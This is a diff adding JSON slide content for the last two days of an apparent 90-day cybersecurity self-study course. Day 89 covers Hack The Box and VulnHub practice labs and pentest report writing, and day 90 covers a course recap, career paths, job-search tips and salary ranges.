+        "heading": "Starting Point: __8 Free Machines__, 8 Skills",
+        "body": [
+          {"type": "bullet", "text": "**Meow (Tier 0):** Telnet default credentials — the simplest possible entry point. Teaches: service enumeration, credential testing."},
+          {"type": "bullet", "text": "**Fawn (Tier 0):** Anonymous FTP login — files accessible without authentication. Teaches: FTP enumeration, anonymous access."},
+          {"type": "bullet", "text": "**Dancing (Tier 0):** SMB null session — enumerate shares without credentials. Teaches: SMB enumeration with smbclient."},
+          {"type": "bullet", "text": "**Redeemer (Tier 0):** Redis with no authentication — dump the in-memory database. Teaches: uncommon service enumeration."},
+          {"type": "bullet", "text": "**Explosion (Tier 1):** RDP default credentials — graphical remote access. Teaches: RDP enumeration, Windows target access."},
+          {"type": "bullet", "text": "**Preignition (Tier 1):** Web application with default admin credentials on a hidden directory. Teaches: gobuster, web credential testing."}
+        ],
+        "time": "90 min · Complete all 4 Tier 0 machines today"
+      },
+      {
+        "type": "dark",
+        "label": "VulnHub for Offline Practice",
+        "tag": "Offline Lab",
+        "method": "WHAT — Free Downloadable Vulnerable VMs",
+        "heading": "VulnHub: __Free Offline Lab Machines__",
+        "body": [
+          {"type": "para", "text": "**VulnHub** provides free downloadable vulnerable VMs — no subscription, no internet required. Import to VirtualBox, put on host-only network with Kali, start hacking."},
+          {"type": "bullet", "text": "**Mr. Robot** — 3 flags, web enumeration + WordPress + Linux privilege escalation. Based on the TV show."},
+          {"type": "bullet", "text": "**Kioptrix Level 1** — classic beginner machine with multiple exploitation paths. Great OSCP prep."},
+          {"type": "bullet", "text": "**DC-1** — Drupal CMS exploitation + Linux privesc. Realistic web application attack chain."},
+          {"type": "bullet", "text": "**Basic Pentesting** — multiple services, multiple entry points. Perfect for practising the full methodology."},
+          {"type": "para", "text": "**CTF strategy:** Struggle for 15–20 minutes before checking technique references (not specific machine solutions). Document every step even if you do not solve it — the investigation process is the learning."}
+        ],
+        "time": "Download and start Mr. Robot if time permits"
+      },
+      {
+        "type": "white",
+        "label": "Professional Pentest Report",
+        "tag": "Career Deliverable",
+        "method": "HOW — Writing Reports That Get You Hired",
+        "heading": "Pentest Report: __The Real Deliverable__",
+        "body": [
+          {"type": "para", "text": "**A polished 15-page pentest report is worth more on your portfolio than 50 screenshots of shells.** The report IS the professional deliverable — what clients pay for and what employers evaluate."},
+          {"type": "bullet", "text": "**Executive Summary (1 page):** Written for management — zero technical jargon. Business risk and impact focus. The CEO reads ONLY this."},
+          {"type": "bullet", "text": "**Technical Findings (one page per finding):** Title · Severity · CVSS score · Affected system · Description · Evidence (screenshot + command) · Reproduction steps · Remediation recommendation."},
+          {"type": "bullet", "text": "**Appendix:** Full scan output, tool versions, testing timeline, methodology references."},
+          {"type": "para", "text": "**Free template:** github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report — professional structure used by real pentest firms. Clone it, fill in your Metasploitable2 findings, export as PDF, upload to GitHub."}
+        ],
+        "time": "60 min · Write your Metasploitable2 report using the TCM template"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 89 Learning Targets",
+        "heading": "Day 89 Checklist",
+        "steps": [
+          "**Complete** HTB Starting Point Tier 0 — all 4 machines (Meow, Fawn, Dancing, Redeemer) — takes ~90 minutes",
+          "**Write** a pentest report for your Metasploitable2 work using the TCM Security template",
+          "**Include** at minimum 3 findings: vsftpd backdoor, open SMB, web SQLi on DVWA",
+          "**Upload** the PDF report to your GitHub cybersecurity-tools repo — a pentest report on GitHub is instant credibility",
+          "Watch **IppSec's walkthrough** for any HTB machine you completed — see the methodology you missed"
+        ],
+        "time": "Total Day 89 Study Time: 150 – 180 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 89",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "🏆 Practice", "name": "HackTheBox — Starting Point (completely free)", "url": "hackthebox.com"},
+          {"label": "📺 Videos", "name": "IppSec — Best HTB Machine Walkthroughs (YouTube)", "url": "youtube.com/@ippsec"},
+          {"label": "📋 Template", "name": "TCM Security — Free Professional Pentest Report Template", "url": "github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report"},
+          {"label": "🎯 Targets", "name": "VulnHub — Free Downloadable Vulnerable VMs", "url": "vulnhub.com"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 89",
+        "heading": "Your Hands-On __Task__ for Day 89",
+        "steps": [
+          "**Complete** HTB Starting Point Tier 0 all 4 machines — document every command used",
+          "**Clone** TCM Security report template from GitHub — fill in your Metasploitable2 findings",
+          "**Write** Executive Summary (3 sentences) + 3 Technical Findings with evidence screenshots",
+          "**Export** as PDF → upload to GitHub cybersecurity-tools repo → add link to your README"
+        ],
+        "time": "Hands-On Task: 120 – 150 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 89",
+        "quote": "Solve a machine then IMMEDIATELY watch IppSec's walkthrough. You will see the same solution plus 5 additional techniques, alternative approaches, and professional methodology you completely missed. Do this for 20 machines and your instincts become elite.",
+        "sub": "Never share active HTB machine flags, solutions, or spoilers publicly. It violates HTB's Terms of Service and disrespects the community that maintains the platform. Wait until a machine is retired before posting public writeups. The community's trust — and the platform's value to everyone — depends on this respect.",
+        "mistake": "Writing a pentest report that only technical people can understand. A professional report serves multiple audiences simultaneously: executive summary for leadership (business impact, no jargon), technical findings for security teams (reproduction steps, evidence, code), IOC appendix for defensive tools (IPs, hashes, indicators). Write each section for its specific reader."
+      }
+    ]
+  },
+
+  {
+    "day": 90,
+    "cover": {
+      "title": "DAY 90: __Complete Roadmap Recap__ & Your Next 90 Days",
+      "hook": "DAY 90. YOU DID IT. 90 days. 90 posts. 900 slides. Your cybersecurity foundation is fully built.",
+      "tags": ["#Day90of90", "#90DaysOfCybersecurity", "#CareerLaunch"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Phases 1–5 Mastered",
+        "tag": "Your Achievement",
+        "method": "WHAT — Everything You Built in Phases 1–5",
+        "heading": "Phases 1–5: __5 Domains Mastered__",
+        "body": [
+          {"type": "bullet", "text": "**Phase 1 — Networking:** OSI model, TCP/IP, subnetting, DNS, protocols, ports, VPN, IDS/IPS — complete networking foundation every security role requires."},
+          {"type": "bullet", "text": "**Phase 2 — Security+:** CIA triad, malware types, phishing, cryptography, IAM, risk management, incident response — the full Security+ knowledge base."},
+          {"type": "bullet", "text": "**Phase 3 — Linux:** CLI mastery, file permissions, Bash scripting, SSH hardening, log analysis, forensics, OverTheWire Bandit — professional Linux proficiency."},
+          {"type": "bullet", "text": "**Phase 4 — Python:** Sockets, Scapy, OSINT automation, threat intel APIs, Pandas log analysis, CLI security tools — security developer capabilities."},
+          {"type": "bullet", "text": "**Phase 5 — Traffic Analysis:** Wireshark, tcpdump, Suricata, Zeek, Security Onion, malware traffic, threat hunting — professional traffic analyst skills."}
+        ],
+        "pills": [
+          {"text": "90 Days Done", "t": "r"},
+          {"text": "Career Ready", "t": "y"},
+          {"text": "Keep Going", "t": "o"}
+        ],
+        "time": "Review all 9 phases — appreciate how far you have come"
+      },
+      {
+        "type": "red",
+        "label": "Phases 6–9 Mastered",
+        "tag": "Advanced Domains",
+        "method": "WHAT — Everything You Built in Phases 6–9",
+        "heading": "Phases 6–9: __4 Advanced Domains__",
+        "body": [
+          {"type": "bullet", "text": "**Phase 6 — Git & DevSecOps:** Version control, branching, PRs, GitHub Actions CI/CD pipelines, Detection-as-Code with Sigma rules — the complete modern security engineering workflow."},
+          {"type": "bullet", "text": "**Phase 7 — ELK SIEM:** Logstash pipelines, Kibana dashboards, KQL queries, Filebeat log shipping, Elastic Security detection rules, full SOC investigation workflow from alert to closed case."},
+          {"type": "bullet", "text": "**Phase 8 — Cloud Security:** Cloud IAM, AWS/GCP/Azure security architecture, container security, CloudGoat pentesting, IaC scanning with Checkov, cloud incident response — cloud security practitioner knowledge."},
+          {"type": "bullet", "text": "**Phase 9 — Ethical Hacking:** Pentest methodology, Nmap recon, Metasploit exploitation, Burp Suite web hacking, HTB/CTF practice, professional pentest report writing — the complete ethical hacker skill set."}
+        ],
+        "time": "Update your LinkedIn and GitHub with all 9 phase skills today"
+      },
+      {
+        "type": "dark",
+        "label": "Your Next 90 Days",
+        "tag": "Career Paths",
+        "method": "WHAT — Pick One Path and Go Deep",
+        "heading": "Next 90 Days: __Choose ONE Path__",
+        "body": [
+          {"type": "bullet", "text": "**SOC Analyst Path:** Security+ exam → CySA+ → Splunk Core User → apply for Tier 1 SOC roles immediately. The most accessible entry point with your current skills."},
+          {"type": "bullet", "text": "**Penetration Tester Path:** eJPT → PNPT → continue HTB/VulnHub daily → OSCP (the gold standard). Requires 6–12 months of dedicated lab practice beyond Day 90."},
+          {"type": "bullet", "text": "**Cloud Security Path:** SC-200 or AWS Security Specialty → cloud security portfolio project → apply for cloud security engineer roles. Highest-paying entry-level path at $95–115k."},
+          {"type": "bullet", "text": "**Security Engineer / DevSecOps:** Build on GitHub Actions + Checkov work → AWS Solutions Architect Associate → target companies with open-source security stacks."},
+          {"type": "para", "text": "**Focus beats spreading.** Choose the path that excites you most. Deep expertise in one domain beats shallow knowledge across four — always."}
+        ],
+        "time": "Decide your path today — write it down and commit to it"
+      },
+      {
+        "type": "white",
+        "label": "Job Application Strategy",
+        "tag": "Career Action",
+        "method": "HOW — Getting Your First Security Role",
+        "heading": "Job Strategy: __Apply Today, Not When Ready__",
+        "steps": [
+          "**LinkedIn:** Optimise your profile — security skills section + headline with target role + 90-day journey post + connect with 20 security professionals this week",
+          "**GitHub:** 6+ pinned repos + pentest report PDF + cloud audit project + Sigma rules collection — your portfolio is already built",
+          "**Resume:** 1 page, lead with technical skills, emphasise PROJECTS over coursework — your GitHub is your experience",
+          "**Apply:** 10 applications per week minimum — Indeed, LinkedIn Jobs, CyberSecJobs.com, DICE, direct company career pages",
+          "**Apply even when not ready** — the application process reveals exactly what gaps to fill next"
+        ],
+        "time": "Apply to 3 security jobs TODAY — before you feel ready"
+      },
+      {
+        "type": "yellow",
+        "label": "Salary Ranges & Target Roles",
+        "tag": "Market Reality",
+        "method": "WHAT — What Your Skills Are Worth",
+        "heading": "Day 90 Final Checklist",
+        "steps": [
+          "**Post** your Day 90 celebration on LinkedIn with your GitHub link and target role",
+          "**Write** resume bullet points for your top 3 portfolio projects — specific, measurable, tool-named",
+          "**Apply** to 3 security jobs today — the application process teaches you what to build next",
+          "**Connect** with 5 security professionals on LinkedIn — personalised notes, not copy-paste",
+          "**Schedule** your first certification exam date — booking it transforms intention into commitment"
+        ],
+        "time": "Do all 5 tasks today — Day 90 is the beginning, not the finish line"
+      },
+      {
+        "type": "resources_white",
+        "label": "Keep Learning Forever",
+        "tag": "Lifelong Resources",
+        "method": "WHERE — Stay Current in Security",
+        "heading": "Free Resources: __Never Stop Learning__",
+        "resources": [
+          {"label": "📰 News", "name": "Krebs on Security · The Hacker News · Bleeping Computer", "url": "krebsonsecurity.com"},
+          {"label": "🎙️ Podcasts", "name": "Darknet Diaries · Risky Business — weekly listening habit", "url": "darknetdiaries.com"},
+          {"label": "🎯 Framework", "name": "MITRE ATT&CK — updated continuously, bookmark forever", "url": "attack.mitre.org"},
+          {"label": "🎤 Conferences", "name": "BSides (many free) · DEF CON talks (all free on YouTube)", "url": "youtube.com/@DEFCONConference"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Salary Ranges (US 2025)",
+        "tag": "Market Data",
+        "method": "WHY — What Your Skills Are Worth",
+        "heading": "Your Skills Are Worth: __Real Salary Ranges__",
+        "steps": [
+          "**SOC Analyst Tier 1:** $50–70k — immediately achievable with your current skills and Security+",
+          "**SOC Analyst Tier 2:** $70–90k — after 12–18 months experience and CySA+",
+          "**Junior Penetration Tester:** $65–85k — after eJPT/PNPT and consistent HTB practice",
+          "**Cloud Security Engineer (entry):** $95–115k — highest-paying entry path with AWS Security Specialty",
+          "**Detection Engineer:** $110–145k — Sigma + ELK + ATT&CK + development skills combined",
+          "**Threat Hunter:** $110–150k — requires 2–3 years SOC experience plus hunting methodology"
+        ],
+        "time": "Research salaries in YOUR specific market at levels.fyi and glassdoor.com"
+      },
+      {
+        "type": "stats",
+        "label": "90 Days Complete",
+        "tag": "Your Achievement",
+        "method": "WHY — The Value of 90 Days",
+        "heading": "90 Days __Complete__ — What You Built",
+        "stats": [
+          {"value": "90", "label": "Days of consistent daily learning — not one missed"},
+          {"value": "9", "label": "Security domains mastered: Networking through Ethical Hacking"},
+          {"value": "7+", "label": "Portfolio projects live on GitHub with full documentation"},
+          {"value": "3.5M", "label": "Unfilled cybersecurity positions globally — the market needs you"}
+        ]
+      },
+      {
+        "type": "quote",
+        "label": "Final Pro Tip",
+        "tag": "Day 90 — The Beginning",
+        "quote": "The cybersecurity talent shortage is 3.5 million unfilled positions globally. Demand permanently exceeds supply. Every day you continue practicing makes you more valuable in a market that desperately needs skilled people.",
+        "sub": "You are NOT the same person who started Day 1. You understand networking at packet level, write working security tools, operate Linux fluently, build SIEMs, audit cloud infrastructure, and conduct penetration tests. That combination exists in a tiny fraction of the security workforce. The community is welcoming and supportive of people who show real, consistent effort. Show up, build publicly, connect genuinely. Your career in security is not a question of IF — it is a question of WHEN.",
+        "mistake": "Thinking Day 90 is the finish line. It is the foundation. The best security professionals never stop learning — because attackers never stop evolving. Security changes weekly. Your 90-day habit of daily consistent learning is the single most valuable thing you built. Keep it. The compounding effect of continued daily practice over the next year will transform you from a knowledgeable beginner into a genuine expert."
+      }
+    ]
+  }
+]
